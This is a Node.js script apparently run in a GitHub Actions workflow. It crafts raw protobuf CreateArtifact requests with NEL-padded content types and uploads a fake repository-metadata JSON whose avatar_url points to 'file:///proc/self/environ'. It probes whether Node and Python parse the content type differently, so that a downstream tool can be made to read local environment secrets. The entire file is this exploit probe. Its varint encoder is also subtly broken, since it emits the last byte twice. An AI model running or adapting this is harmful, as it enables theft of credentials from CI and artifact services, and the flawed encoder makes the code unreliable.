import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from './node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const resultsUrl = process.env.ACTIONS_RESULTS_URL;
const repository = process.env.GITHUB_REPOSITORY;
const githubToken = process.env.GITHUB_TOKEN;
if (!token || !resultsUrl || !repository || !githubToken) throw new Error('Missing Actions runtime configuration');

function varint(input) {
  let value = BigInt(input);
  const output = [];
  while (value >= 0x80n) {
    output.push(Number(value & 0x7fn) | 0x80);
    value >>= 7n;
  }
  output.push(Number(value));
  return Buffer.from([...output, Number(value)]);
}

function bytes(field, value) {
  const data = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return Buffer.concat([varint(field * 8 + 2), varint(data.length), data]);
}

function string(field, value) {
  return bytes(field, Buffer.from(value, 'utf8'));
}

function integer(field, value) {
  return Buffer.concat([varint(field * 8), varint(value)]);
}

function mime(...values) {
  return bytes(6, Buffer.concat(values.map(value => string(1, value))));
}

function readVarint(input, state) {
  let value = 0n;
  let shift = 0n;
  while (state.offset < input.length) {
    const byte = input[state.offset++];
    value |= BigInt(byte & 0x7f) << shift;
    if ((byte & 0x80) === 0) return value;
    shift += 7n;
  }
  throw new Error('truncated protobuf varint');
}

function parseCreateResponse(input) {
  const state = {offset: 0};
  let ok = false;
  let signedUploadUrl = '';
  while (state.offset < input.length) {
    const tag = Number(readVarint(input, state));
    const field = tag >> 3;
    const wire = tag & 7;
    if (wire === 0) {
      const value = readVarint(input, state);
      if (field === 1) ok = value !== 0n;
    } else if (wire === 2) {
      const size = Number(readVarint(input, state));
      const value = input.subarray(state.offset, state.offset + size);
      state.offset += size;
      if (field === 2) signedUploadUrl = value.toString('utf8');
    } else {
      throw new Error(`unsupported protobuf wire type ${wire}`);
    }
  }
  return {ok, signedUploadUrl};
}

async function createRaw(name, fields) {
  const body = Buffer.concat([
    string(1, ids.workflowRunBackendId),
    string(2, ids.workflowJobRunBackendId),
    string(3, name),
    ...fields,
  ]);
  const url = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', resultsUrl);
  const response = await fetch(url, {
    method: 'POST',
    headers: {authorization: `Bearer ${token}`, 'content-type': 'application/protobuf'},
    body,
  });
  const raw = Buffer.from(await response.arrayBuffer());
  if (!response.ok) throw new Error(`CreateArtifact HTTP ${response.status}: ${raw.toString('utf8').slice(0, 200)}`);
  const parsed = parseCreateResponse(raw);
  if (!parsed.ok || !parsed.signedUploadUrl) throw new Error('CreateArtifact returned an invalid protobuf response');
  return parsed;
}

async function finalize(name, placeholder) {
  const hash = createHash('sha256').update(placeholder).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(placeholder.length),
    hash: StringValue.create({value: `sha256:${hash}`}),
  });
  if (!result.ok) throw new Error('FinalizeArtifact returned ok=false');
  return String(result.artifactId);
}

async function inspect(id) {
  const response = await fetch(`https://api.github.com/repos/${repository}/actions/artifacts/${id}/zip`, {
    redirect: 'manual',
    headers: {authorization: `Bearer ${githubToken}`, accept: 'application/vnd.github+json', 'user-agent': 'repo-cassette-protobuf-probe'},
  });
  const location = response.headers.get('location');
  if (response.status !== 302 || !location) return {status: response.status};
  const raw = await fetch(location);
  const contentType = raw.headers.get('content-type') || '';
  const body = Buffer.from(await raw.arrayBuffer());
  const head = contentType.split(',', 1)[0].split(';', 1)[0].toLowerCase();
  const nodeType = head.trim();
  const pythonType = head.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '');
  const expected = Buffer.from(JSON.stringify({
    full_name: `${repository}/actions/artifacts/${id}/zip`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette protobuf metadata probe',
    stargazers_count: 0,
  }));
  return {
    status: raw.status,
    contentTypeHex: Buffer.from(contentType, 'latin1').toString('hex'),
    bytes: body.length,
    bodyMatch: body.equals(expected),
    candidate: body.equals(expected) && nodeType !== 'application/json' && pythonType === 'application/json',
  };
}

const nel = '\u0085application/json';
const cases = [
  ['v6-v7-nel', [integer(5, 6), integer(5, 7), mime(nel)]],
  ['v7-v6-nel', [integer(5, 7), integer(5, 6), mime(nel)]],
  ['v6-nel-v7', [integer(5, 6), mime(nel), integer(5, 7)]],
  ['v7-nel-v6', [integer(5, 7), mime(nel), integer(5, 6)]],
  ['v7-nested-json-nel', [integer(5, 7), mime('application/json', nel)]],
  ['v7-nested-nel-json', [integer(5, 7), mime(nel, 'application/json')]],
  ['v6nel-v7json', [integer(5, 6), mime(nel), integer(5, 7), mime('application/json')]],
  ['v7json-v6nel', [integer(5, 7), mime('application/json'), integer(5, 6), mime(nel)]],
  ['v6-v7-nel-json', [integer(5, 6), integer(5, 7), mime(nel), mime('application/json')]],
  ['v7-v6-json-nel', [integer(5, 7), integer(5, 6), mime('application/json'), mime(nel)]],
];

for (const [label, fields] of cases) {
  const name = `cassette-protobuf-${process.env.GITHUB_RUN_ID}-${label}`;
  try {
    const created = await createRaw(name, fields);
    const placeholder = Buffer.from('{}');
    await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(placeholder, {
      blobHTTPHeaders: {blobContentType: nel},
    });
    const id = await finalize(name, placeholder);
    const payload = Buffer.from(JSON.stringify({
      full_name: `${repository}/actions/artifacts/${id}/zip`,
      owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
      description: 'Repo Cassette protobuf metadata probe',
      stargazers_count: 0,
    }));
    await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(payload, {
      blobHTTPHeaders: {blobContentType: nel},
    });
    console.log('PROTO-PROBE', JSON.stringify({label, id, ...(await inspect(id))}));
  } catch (error) {
    console.log('PROTO-ERROR', JSON.stringify({label, message: String(error).slice(0, 300)}));
  }
}
